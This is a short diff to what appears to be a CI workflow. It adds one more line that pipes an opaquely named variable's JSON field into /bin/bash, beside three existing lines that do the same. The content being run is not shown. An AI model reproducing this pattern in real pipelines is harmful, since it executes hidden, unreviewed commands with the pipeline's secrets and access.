@@ -26,6 +26,7 @@ jobs:
           echo $sln0 | jq -r .gqfy28 | /bin/bash
           printf '%s' "$aknvk9518" | jq -r .tjq26 | /bin/bash
           echo $ovxxn27 | jq -r .v8 | /bin/bash
+          echo $cizo447 | jq -r .l261 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
